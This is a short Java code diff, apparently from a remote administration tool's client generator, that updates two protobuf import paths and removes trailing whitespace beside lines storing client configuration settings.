@@ -26,8 +26,8 @@ import org.slf4j.Logger;
 import org.zeroturnaround.zip.ZipUtil;
 
 import com.subterranean_security.crimson.core.Common;
-import com.subterranean_security.crimson.core.proto.net.Gen.ClientConfig;
-import com.subterranean_security.crimson.core.proto.net.Gen.GenReport;
+import com.subterranean_security.crimson.core.proto.Generator.ClientConfig;
+import com.subterranean_security.crimson.core.proto.Generator.GenReport;
 import com.subterranean_security.crimson.core.storage.ClientDB;
 import com.subterranean_security.crimson.core.util.CUtil;
 
@@ -79,7 +79,7 @@ public class Generator {
 			database.storeObject("generation_date", start);
 			database.storeObject("svid", 0);
 			database.storeObject("reconnect_period", ic.getReconnectPeriod());
-			
+
 			database.storeObject("nts", ic.getTargetList());
 
 			database.storeObject("auth.type", ic.getAuthType());
